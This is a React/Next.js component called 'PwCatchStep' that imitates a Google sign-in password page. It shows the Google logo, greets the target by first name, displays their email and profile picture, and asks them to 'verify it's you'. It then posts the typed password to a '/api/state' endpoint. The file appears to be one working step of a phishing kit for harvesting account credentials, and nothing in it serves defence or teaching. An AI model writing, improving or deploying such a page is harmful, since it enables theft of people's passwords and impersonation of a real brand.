"use client";

import { useState } from "react";
import { useForm, type SubmitHandler } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import Image from "next/image";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { UserCircle, ChevronDown } from "lucide-react";
import { Checkbox } from "@/components/ui/checkbox";

const passwordSchema = z.object({
  password: z.string().min(1, { message: "Please enter your password." }),
});
type PasswordFormData = z.infer<typeof passwordSchema>;

type PwCatchStepProps = {
  email: string;
  name: string;
  profilePicture: string;
};

export default function PwCatchStep({ email, name, profilePicture }: PwCatchStepProps) {
  const { register, handleSubmit, formState: { errors, isSubmitting } } = useForm<PasswordFormData>({
    resolver: zodResolver(passwordSchema),
  });
  const { toast } = useToast();
  const [showPassword, setShowPassword] = useState(false);

  const onSubmit: SubmitHandler<PasswordFormData> = async (data) => {
    try {
      const res = await fetch("/api/state", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "submitPassword", password: data.password }),
      });
      if (!res.ok) throw new Error("Server responded with an error.");
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Error",
        description: "Could not proceed. Please try again.",
      });
    }
  };

  return (
    <div className="w-full max-w-md mx-auto text-center">
        <svg
            className="h-8 w-8 mb-6 mx-auto"
            viewBox="0 0 24 24"
            fill="none"
            xmlns="http://www.w3.org/2000/svg"
        >
            <path
            d="M22.56 12.25C22.56 11.42 22.49 10.61 22.36 9.82H11.5V14.29H17.84C17.58 15.84 16.79 17.15 15.59 18V20.59H19.24C21.35 18.73 22.56 15.77 22.56 12.25Z"
            fill="#4285F4"
            />
            <path
            d="M11.5 23C14.47 23 17 21.64 18.54 19.68L15.59 18C14.59 18.69 13.16 19.25 11.5 19.25C8.42 19.25 5.79 17.29 4.88 14.5H1.08V17.09C2.92 20.62 6.84 23 11.5 23Z"
            fill="#34A853"
            />
            <path
            d="M4.88 14.5C4.63 13.73 4.5 12.89 4.5 12C4.5 11.11 4.63 10.27 4.88 9.5L4.88 6.91H1.08C0.39 8.27 0 10.06 0 12C0 13.94 0.39 15.73 1.08 17.09L4.88 14.5Z"
            fill="#FBBC05"
            />
            <path
            d="M11.5 4.75C12.98 4.75 14.24 5.27 15.22 6.2L18.62 2.8C16.92 1.14 14.47 0 11.5 0C6.84 0 2.92 2.38 1.08 5.91L4.88 8.5C5.79 5.71 8.42 4.75 11.5 4.75Z"
            fill="#EA4335"
            />
        </svg>
        <h1 className="text-3xl font-normal">Hi {name.split(' ')[0]}</h1>

        <div className="mt-4 flex items-center justify-center gap-2 rounded-full border p-1 pr-3 w-fit mx-auto">
            <div className="flex items-center gap-2">
            {profilePicture ? (
                <Image 
                    src={profilePicture} 
                    alt={name || email} 
                    width={24} 
                    height={24} 
                    className="rounded-full object-cover w-6 h-6"
                    data-ai-hint="person avatar" 
                />
            ) : (
                <UserCircle className="h-6 w-6 text-muted-foreground"/>
            )}
            <span className="text-sm font-medium">{email}</span>
            </div>
            <ChevronDown className="h-4 w-4 text-muted-foreground" />
        </div>

        <p className="text-sm text-left mt-8">To continue, first verify it’s you</p>
        
        <form onSubmit={handleSubmit(onSubmit)} className="mt-2 space-y-6 text-left">
            <div className="relative">
                <Input
                    id="password"
                    type={showPassword ? "text" : "password"}
                    placeholder="Enter your password"
                    {...register("password")}
                    className="h-14 pt-2 text-base"
                />
                {errors.password && <p className="text-sm text-destructive mt-1 px-1">{errors.password.message}</p>}
            </div>

            <div className="flex items-center space-x-2">
                <Checkbox id="show-password" onCheckedChange={() => setShowPassword(!showPassword)} />
                <label
                    htmlFor="show-password"
                    className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"
                >
                    Show password
                </label>
            </div>
        
            <div className="flex justify-between items-center pt-8">
                <Button variant="ghost" className="text-primary font-semibold">Try another way</Button>
                <Button type="submit" disabled={isSubmitting} className="font-semibold">
                    {isSubmitting ? "Verifying..." : "Next"}
                </Button>
            </div>
        </form>

    </div>
  );
}
